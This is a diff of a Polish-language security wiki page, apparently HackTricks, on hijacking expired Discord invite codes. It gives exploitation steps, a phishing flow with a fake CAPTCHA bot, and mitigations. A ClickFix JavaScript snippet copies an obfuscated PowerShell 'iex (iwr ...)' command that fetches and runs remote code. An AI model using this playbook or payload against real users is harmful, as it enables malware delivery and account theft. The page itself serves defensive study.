@@ -1,41 +1,41 @@
-# Discord Invite Hijacking
+# Przejęcie zaproszeń Discord
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Luka w systemie zaproszeń Discorda pozwala aktorom zagrożeń na przejęcie wygasłych lub usuniętych kodów zaproszeń (tymczasowych, stałych lub niestandardowych) jako nowych linków niestandardowych na każdym serwerze z poziomem 3. Normalizując wszystkie kody do małych liter, atakujący mogą wstępnie zarejestrować znane kody zaproszeń i cicho przejąć ruch, gdy oryginalny link wygaśnie lub źródłowy serwer straci swoje wzmocnienie.
+Luka w systemie zaproszeń Discord pozwala threat actors przejmować wygasłe lub usunięte kody zaproszeń (tymczasowe, stałe lub niestandardowe vanity) jako nowe vanity links na dowolnym serwerze z Level 3 Boost. Ponieważ wszystkie kody są normalizowane do małych liter, attackers mogą wcześniej zarejestrować znane kody zaproszeń i po cichu przejąć ruch, gdy pierwotny link wygaśnie lub serwer źródłowy utraci Boost.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ## Typy zaproszeń i ryzyko przejęcia
 
-| Typ zaproszenia       | Można przejąć? | Warunek / Uwagi                                                                                          |
-|-----------------------|----------------|----------------------------------------------------------------------------------------------------------|
-| Tymczasowy link zaproszenia | ✅          | Po wygaśnięciu kod staje się dostępny i może być ponownie zarejestrowany jako URL niestandardowy przez wzmocniony serwer. |
-| Stały link zaproszenia | ⚠️          | Jeśli zostanie usunięty i składa się tylko z małych liter i cyfr, kod może stać się ponownie dostępny.   |
-| Niestandardowy link niestandardowy | ✅          | Jeśli oryginalny serwer straci swoje wzmocnienie poziomu 3, jego zaproszenie niestandardowe staje się dostępne do nowej rejestracji. |
+| Typ zaproszenia           | Możliwe do przejęcia? | Warunek / Uwagi                                                                                       |
+|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
+| Tymczasowy link zaproszenia | ✅          | Po wygaśnięciu kod staje się dostępny i może zostać ponownie zarejestrowany jako vanity URL przez serwer z Boost. |
+| Stały link zaproszenia | ⚠️          | Jeśli zostanie usunięty i składa się wyłącznie z małych liter oraz cyfr, kod może ponownie stać się dostępny.        |
+| Niestandardowy vanity link    | ✅          | Jeśli pierwotny serwer utraci Level 3 Boost, jego vanity invite stanie się dostępne do ponownej rejestracji.    |
 
-## Kroki eksploatacji
+## Kroki exploitacji
 
 1. Rozpoznanie
-- Monitoruj publiczne źródła (fora, media społecznościowe, kanały Telegram) w poszukiwaniu linków zaproszeń pasujących do wzoru `discord.gg/{code}` lub `discord.com/invite/{code}`.
-- Zbieraj interesujące kody zaproszeń (tymczasowe lub niestandardowe).
+- Monitoruj publiczne źródła (fora, media społecznościowe, kanały Telegram) w poszukiwaniu linków zaproszeń pasujących do wzorca `discord.gg/{code}` lub `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
+- Zbieraj interesujące kody zaproszeń (tymczasowe lub vanity).
 2. Wstępna rejestracja
-- Utwórz lub użyj istniejącego serwera Discord z uprawnieniami poziomu 3.
-- W **Ustawienia serwera → URL niestandardowy**, spróbuj przypisać docelowy kod zaproszenia. Jeśli zostanie zaakceptowany, kod jest zarezerwowany przez złośliwy serwer.
+- Utwórz serwer Discord z uprawnieniami Level 3 Boost lub użyj już istniejącego.
+- W **Server Settings → Vanity URL** spróbuj przypisać docelowy kod zaproszenia. Jeśli zostanie zaakceptowany, kod zostanie zarezerwowany przez malicious server.
 3. Aktywacja przejęcia
-- W przypadku tymczasowych zaproszeń, poczekaj, aż oryginalne zaproszenie wygaśnie (lub ręcznie je usuń, jeśli kontrolujesz źródło).
-- W przypadku kodów zawierających wielkie litery, wersja małymi literami może być przejęta natychmiast, chociaż przekierowanie aktywuje się dopiero po wygaśnięciu.
+- W przypadku zaproszeń tymczasowych poczekaj, aż pierwotne zaproszenie wygaśnie (lub usuń je ręcznie, jeśli kontrolujesz źródło).
+- W przypadku kodów zawierających wielkie litery wariant zapisany małymi literami może zostać przejęty natychmiast, jednak przekierowanie aktywuje się dopiero po wygaśnięciu.
 4. Ciche przekierowanie
-- Użytkownicy odwiedzający stary link są bezproblemowo kierowani do serwera kontrolowanego przez atakującego, gdy przejęcie jest aktywne.
+- Użytkownicy odwiedzający stary link zostaną płynnie przekierowani na serwer kontrolowany przez attackera, gdy przejęcie stanie się aktywne.
 
-## Przepływ phishingowy przez serwer Discord
+## Phishing Flow via Discord Server
 
-1. Ogranicz kanały serwera, aby tylko kanał **#verify** był widoczny.
-2. Wdróż bota (np. **Safeguard#0786**), aby zachęcał nowicjuszy do weryfikacji za pomocą OAuth2.
-3. Bot przekierowuje użytkowników na stronę phishingową (np. `captchaguard.me`) pod pretekstem kroku CAPTCHA lub weryfikacji.
-4. Wdróż sztuczkę UX **ClickFix**:
-- Wyświetl komunikat o uszkodzonym CAPTCHA.
-- Poprowadź użytkowników do otwarcia okna dialogowego **Win+R**, wklejenia wstępnie załadowanej komendy PowerShell i naciśnięcia Enter.
+1. Ogranicz kanały serwera tak, aby widoczny był wyłącznie kanał **#verify**.<sup>[[1]](#references)</sup>
+2. Wdróż bota (np. **Safeguard#0786**), aby prosił nowych użytkowników o weryfikację za pomocą OAuth2.
+3. Bot przekierowuje użytkowników do phishing site (np. `captchaguard.me`) pod pretekstem CAPTCHA lub etapu weryfikacji.
+4. Zaimplementuj trik UX **ClickFix**:
+- Wyświetl komunikat o uszkodzonej CAPTCHA.
+- Nakłoń użytkowników do otwarcia okna **Win+R**, wklejenia wstępnie załadowanej komendy PowerShell i naciśnięcia Enter.
 
-### Przykład wstrzyknięcia ClickFix do schowka
+### Przykład wstrzyknięcia do schowka ClickFix
 ```javascript
 // Copy malicious PowerShell command to clipboard
 const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
@@ -44,18 +44,18 @@ const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9
 `iex (iwr -Uri $url)"`;
 navigator.clipboard.writeText(cmd);
 ```
-To podejście unika bezpośrednich pobrań plików i wykorzystuje znane elementy interfejsu użytkownika, aby zmniejszyć podejrzenia użytkowników.
+To podejście pozwala uniknąć bezpośredniego pobierania plików i wykorzystuje znane elementy interfejsu użytkownika, aby zmniejszyć podejrzliwość użytkownika.<sup>[[1]](#references)</sup>
 
-## Mitigacje
+## Sposoby zapobiegania
 
-- Używaj stałych linków zaproszeń zawierających przynajmniej jedną wielką literę lub znak niealfanumeryczny (nigdy nie wygasają, nie są wielokrotnego użytku).
+- Używaj stałych linków zaproszeń zawierających co najmniej jedną wielką literę lub znak niealfanumeryczny (nigdy nie wygasają i nie można ich ponownie użyć).<sup>[[1]](#references)</sup>
 - Regularnie zmieniaj kody zaproszeń i unieważniaj stare linki.
-- Monitoruj status boosta serwera Discord i roszczenia dotyczące URL vanity.
-- Edukuj użytkowników, aby weryfikowali autentyczność serwera i unikali wykonywania poleceń wklejonych ze schowka.
+- Monitoruj status boostowania serwera Discord oraz przejęcia vanity URL.
+- Edukuj użytkowników, aby weryfikowali autentyczność serwera i unikali wykonywania poleceń wklejanych ze schowka.
 
-## Referencje
+## References
 
-- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
-- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
+- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
+- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
 
 {{#include ../../banners/hacktricks-training.md}}
